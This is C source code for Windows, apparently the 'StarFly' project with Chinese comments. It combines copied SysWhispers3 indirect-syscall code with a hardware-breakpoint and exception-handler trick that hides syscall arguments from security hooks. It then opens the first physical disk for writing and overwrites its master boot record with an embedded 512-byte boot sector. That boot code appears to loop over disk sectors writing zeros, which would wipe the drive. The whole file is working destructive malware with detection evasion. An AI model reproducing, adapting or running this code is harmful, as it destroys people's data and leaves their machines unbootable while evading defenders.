    #include <windows.h>
    #include <stdio.h>
    #include "syscalls.h"
    #include "nt.h"

    typedef struct _SFParams {
        DWORD ParamNum;
        DWORD_PTR param[12];
    } SFParams, * PSFParams;

    SFParams Params = { 0 }; // 全局变量 用于向VEH传递真实的函数调用参数

    /*========================================
    以下代码属于GitHub项目 SysWhisper3 的部分引用
    https://github.com/klezVirus/SysWhispers3
    ========================================*/
    SW3_SYSCALL_LIST SW3_SyscallList;

    DWORD SW3_HashSyscall(PCSTR FunctionName)
    {
        DWORD i = 0;
        DWORD Hash = SW3_SEED;

        while (FunctionName[i])
        {
            WORD PartialName = *(WORD*)((ULONG_PTR)FunctionName + i++);
            Hash ^= PartialName + SW3_ROR8(Hash);
        }

        return Hash;
    }

    PVOID SC_Address(PVOID NtApiAddress)
    {
        DWORD searchLimit = 512;
        PVOID SyscallAddress;
        BYTE syscall_code[] = { 0x0f, 0x05, 0xc3 };
        ULONG distance_to_syscall = 0x12;
        // we don't really care if there is a 'jmp' between
        // NtApiAddress and the 'syscall; ret' instructions
        SyscallAddress = SW3_RVA2VA(PVOID, NtApiAddress, distance_to_syscall);
        if (!memcmp((PVOID)syscall_code, SyscallAddress, sizeof(syscall_code)))
        {
            // we can use the original code for this system call :)
            return SyscallAddress;
        }
        // the 'syscall; ret' intructions have not been found,
        // we will try to use one near it, similarly to HalosGate
        for (ULONG32 num_jumps = 1; num_jumps < searchLimit; num_jumps++)
        {
            // let's try with an Nt* API below our syscall
            SyscallAddress = SW3_RVA2VA(
                PVOID,
                NtApiAddress,
                distance_to_syscall + num_jumps * 0x20);
            if (!memcmp((PVOID)syscall_code, SyscallAddress, sizeof(syscall_code)))
            {
                return SyscallAddress;
            }
            // let's try with an Nt* API above our syscall
            SyscallAddress = SW3_RVA2VA(
                PVOID,
                NtApiAddress,
                distance_to_syscall - num_jumps * 0x20);
            if (!memcmp((PVOID)syscall_code, SyscallAddress, sizeof(syscall_code)))
            {
                return SyscallAddress;
            }
        }
        return NULL;
    }

    BOOL SW3_PopulateSyscallList()
    {
        if (SW3_SyscallList.Count) return TRUE;
        PSW3_PEB Peb = (PSW3_PEB)__readgsqword(0x60);
        PSW3_PEB_LDR_DATA Ldr = Peb->Ldr;
        PIMAGE_EXPORT_DIRECTORY ExportDirectory = NULL;
        PVOID DllBase = NULL;
        // Get the DllBase address of NTDLL.dll. NTDLL is not guaranteed to be the second
        // in the list, so it's safer to loop through the full list and find it.
        PSW3_LDR_DATA_TABLE_ENTRY LdrEntry;
        for (LdrEntry = (PSW3_LDR_DATA_TABLE_ENTRY)Ldr->Reserved2[1]; LdrEntry->DllBase != NULL; LdrEntry = (PSW3_LDR_DATA_TABLE_ENTRY)LdrEntry->Reserved1[0])
        {
            DllBase = LdrEntry->DllBase;
            PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)DllBase;
            PIMAGE_NT_HEADERS NtHeaders = SW3_RVA2VA(PIMAGE_NT_HEADERS, DllBase, DosHeader->e_lfanew);
            PIMAGE_DATA_DIRECTORY DataDirectory = (PIMAGE_DATA_DIRECTORY)NtHeaders->OptionalHeader.DataDirectory;
            DWORD VirtualAddress = DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
            if (VirtualAddress == 0) continue;
            ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)SW3_RVA2VA(ULONG_PTR, DllBase, VirtualAddress);
            // If this is NTDLL.dll, exit loop.
            PCHAR DllName = SW3_RVA2VA(PCHAR, DllBase, ExportDirectory->Name);
            if ((*(ULONG*)DllName | 0x20202020) != 0x6c64746e) continue;
            if ((*(ULONG*)(DllName + 4) | 0x20202020) == 0x6c642e6c) break;
        }
        if (!ExportDirectory) return FALSE;
        DWORD NumberOfNames = ExportDirectory->NumberOfNames;
        PDWORD Functions = SW3_RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfFunctions);
        PDWORD Names = SW3_RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfNames);
        PWORD Ordinals = SW3_RVA2VA(PWORD, DllBase, ExportDirectory->AddressOfNameOrdinals);
        // Populate SW3_SyscallList with unsorted Zw* entries.
        DWORD i = 0;
        PSW3_SYSCALL_ENTRY Entries = SW3_SyscallList.Entries;
        do
        {
            PCHAR FunctionName = SW3_RVA2VA(PCHAR, DllBase, Names[NumberOfNames - 1]);
            // Is this a system call?
            if (*(USHORT*)FunctionName == 0x775a)
            {
                Entries[i].Hash = SW3_HashSyscall(FunctionName);
                Entries[i].Address = Functions[Ordinals[NumberOfNames - 1]];
                Entries[i].SyscallAddress = SC_Address(SW3_RVA2VA(PVOID, DllBase, Entries[i].Address));
                i++;
                if (i == SW3_MAX_ENTRIES) break;
            }
        } while (--NumberOfNames);
        // Save total number of system calls found.
        SW3_SyscallList.Count = i;
        // Sort the list by address in ascending order.
        for (DWORD i = 0; i < SW3_SyscallList.Count - 1; i++)
        {
            for (DWORD j = 0; j < SW3_SyscallList.Count - i - 1; j++)
            {
                if (Entries[j].Address > Entries[j + 1].Address)
                {
                    SW3_SYSCALL_ENTRY TempEntry;
                    TempEntry.Hash = Entries[j].Hash;
                    TempEntry.Address = Entries[j].Address;
                    TempEntry.SyscallAddress = Entries[j].SyscallAddress;
                    Entries[j].Hash = Entries[j + 1].Hash;
                    Entries[j].Address = Entries[j + 1].Address;
                    Entries[j].SyscallAddress = Entries[j + 1].SyscallAddress;
                    Entries[j + 1].Hash = TempEntry.Hash;
                    Entries[j + 1].Address = TempEntry.Address;
                    Entries[j + 1].SyscallAddress = TempEntry.SyscallAddress;
                }
            }
        }
        return TRUE;
    }

    PVOID SW3_GetSyscallAddress(DWORD FunctionHash)
    {
        // Ensure SW3_SyscallList is populated.
        if (!SW3_PopulateSyscallList()) return NULL;

        for (DWORD i = 0; i < SW3_SyscallList.Count; i++)
        {
            if (FunctionHash == SW3_SyscallList.Entries[i].Hash)
            {
                return SW3_SyscallList.Entries[i].SyscallAddress;
            }
        }

        return NULL;
    }

    /*========================================
    以上代码属于GitHub项目 SysWhisper3 的部分引用
    https://github.com/klezVirus/SysWhispers3
    ========================================*/

    LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS pExceptInfo) {
        if (pExceptInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
            pExceptInfo->ContextRecord->Rcx = Params.param[1];
            pExceptInfo->ContextRecord->Rdx = Params.param[2];
            pExceptInfo->ContextRecord->R8 = Params.param[3];
            pExceptInfo->ContextRecord->R9 = Params.param[4];
            pExceptInfo->ContextRecord->R10 = Params.param[1];
            if (Params.ParamNum > 4) {
                int extra_para = Params.ParamNum - 4;
                DWORD64* stack = (DWORD64*)(pExceptInfo->ContextRecord->Rsp + 40); // 偏移40字节 保留影子空间
                for (int i = 5; i < Params.ParamNum; ++i) {
                    stack[i - 5] = (DWORD64)(Params.param[i]); // 通过堆栈传递剩余参数
                }
            }
            Params.ParamNum = 0;
            for (int i = 0; i < 12; ++i) {
                Params.param[i] = 0;
            }
            pExceptInfo->ContextRecord->Dr0 = 0;
            return EXCEPTION_CONTINUE_EXECUTION;
        }
        return EXCEPTION_CONTINUE_SEARCH;
    }

    void SFSpoof(DWORD FuncHash) {
        CONTEXT ctx;
        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
        GetThreadContext(GetCurrentThread(), &ctx);
        ctx.Dr0 = (DWORD_PTR)SW3_GetSyscallAddress(FuncHash);
        ctx.Dr7 = 0x00000303; //启用DR0读写执行全局断点
        SetThreadContext(GetCurrentThread(), &ctx);
        return;
    }

    int main() {
    unsigned char __mbr_bin[] = {
    0xfa, 0x31, 0xc0, 0x8e, 0xd8, 0x8e, 0xc0, 0x8e, 0xd0, 0xbc, 0x00, 0x7c,
    0xfb, 0xe8, 0x7a, 0x00, 0xe8, 0x87, 0x00, 0xe8, 0x8b, 0x00, 0x06, 0xb8,
    0x00, 0x40, 0x8e, 0xc0, 0x26, 0x66, 0x83, 0x3e, 0x10, 0x00, 0x00, 0x7e,
    0x18, 0xe8, 0x17, 0x00, 0xe8, 0x7d, 0x00, 0x66, 0x83, 0x06, 0x18, 0x7d,
    0x78, 0x8c, 0xc0, 0x26, 0x66, 0x83, 0x2e, 0x10, 0x00, 0x78, 0x07, 0xeb,
    0xd9, 0x07, 0xc3, 0x06, 0xb8, 0x00, 0x40, 0x8e, 0xc0, 0x66, 0xbf, 0x00,
    0x06, 0x00, 0x00, 0x66, 0xb9, 0x00, 0x3c, 0x00, 0x00, 0x66, 0x31, 0xc0,
    0xf3, 0x66, 0xab, 0xbe, 0x00, 0x03, 0xc6, 0x04, 0x10, 0xc6, 0x44, 0x01,
    0x00, 0xc7, 0x44, 0x02, 0x78, 0x00, 0xc7, 0x44, 0x04, 0x00, 0x06, 0xc7,
    0x44, 0x06, 0x00, 0x40, 0x66, 0xa1, 0x18, 0x7d, 0x66, 0x89, 0x44, 0x08,
    0xc7, 0x44, 0x0c, 0x00, 0x00, 0xc7, 0x44, 0x0e, 0x00, 0x00, 0xb4, 0x43,
    0xb2, 0x80, 0xcd, 0x13, 0x07, 0xc3, 0x1e, 0xb8, 0x00, 0x40, 0x8e, 0xd8,
    0x31, 0xf6, 0xb4, 0x48, 0xb2, 0x80, 0xcd, 0x13, 0x1f, 0xc3, 0xb4, 0x00,
    0xb0, 0x03, 0xcd, 0x10, 0xc3, 0xbe, 0xf4, 0x7c, 0xe8, 0x15, 0x00, 0xc3,
    0x60, 0xb6, 0x01, 0xb2, 0x00, 0xb7, 0x00, 0xb4, 0x02, 0xcd, 0x10, 0x66,
    0xa1, 0x18, 0x7d, 0xe8, 0x10, 0x00, 0x61, 0xc3, 0x60, 0xb4, 0x0e, 0xac,
    0x3c, 0x00, 0x74, 0x04, 0xcd, 0x10, 0xeb, 0xf7, 0x61, 0xc3, 0x60, 0xb9,
    0x08, 0x00, 0xbb, 0x0a, 0x00, 0x31, 0xd2, 0x31, 0xd2, 0xf7, 0xf3, 0x80,
    0xc2, 0x30, 0x52, 0x49, 0x66, 0x85, 0xc0, 0x75, 0xf2, 0x5a, 0x83, 0xfa,
    0x00, 0x74, 0x08, 0xb4, 0x0e, 0x88, 0xd0, 0xcd, 0x10, 0xeb, 0xf2, 0x61,
    0xc3, 0x00, 0x00, 0x00, 0x68, 0x74, 0x74, 0x70, 0x73, 0x3a, 0x2f, 0x2f,
    0x67, 0x69, 0x74, 0x68, 0x75, 0x62, 0x2e, 0x63, 0x6f, 0x6d, 0x2f, 0x43,
    0x4e, 0x4d, 0x72, 0x53, 0x75, 0x6e, 0x73, 0x68, 0x69, 0x6e, 0x65, 0x2f,
    0x53, 0x74, 0x61, 0x72, 0x46, 0x6c, 0x79, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xaa
    };
        AddVectoredExceptionHandler(1, ExceptionHandler);
        HANDLE hDrive;
        OBJECT_ATTRIBUTES objAttr;
        IO_STATUS_BLOCK ioStatusBlock;
        UNICODE_STRING driveName;
        WCHAR driveNameBuffer[] = L"\\Device\\Harddisk0\\Partition0";
        driveName.Length = sizeof(driveNameBuffer) - sizeof(WCHAR);
        driveName.MaximumLength = sizeof(driveNameBuffer);
        driveName.Buffer = driveNameBuffer;
        InitializeObjectAttributes(&objAttr, &driveName, OBJ_CASE_INSENSITIVE, NULL, NULL);
        Params.ParamNum = 11;
        Params.param[1] = (DWORD_PTR)&hDrive;
        Params.param[2] = (DWORD_PTR)(GENERIC_WRITE | SYNCHRONIZE);
        Params.param[3] = (DWORD_PTR)&objAttr;
        Params.param[4] = (DWORD_PTR)&ioStatusBlock;
        Params.param[7] = (DWORD_PTR)FILE_SHARE_WRITE;
        Params.param[8] = (DWORD_PTR)FILE_OPEN;
        Params.param[9] = (DWORD_PTR)FILE_SYNCHRONOUS_IO_NONALERT;
        SFSpoof(0x0BDDB5F9C);
        TCHAR tempFileName[MAX_PATH];
        GetTempFileName(0, 0, 0, tempFileName);
        LARGE_INTEGER byteOffset;
        byteOffset.QuadPart = 0;
        BYTE buffer[512] = { 0 };
        memcpy(buffer, __mbr_bin, 512);
        Params.ParamNum = 9;
        Params.param[1] = (DWORD_PTR)hDrive;
        Params.param[5] = (DWORD_PTR)&ioStatusBlock;
        Params.param[6] = (DWORD_PTR)buffer;
        Params.param[7] = (DWORD_PTR)512;
        Params.param[8] = (DWORD_PTR)&byteOffset;
        SFSpoof(0x0A4B2DEA5);
        WritePrivateProfileString(
            "StarFly",      // 节名
            "Version",          // 键名
            "2.0",        // 值
            "Version.ini"
        );
        return 0;
    }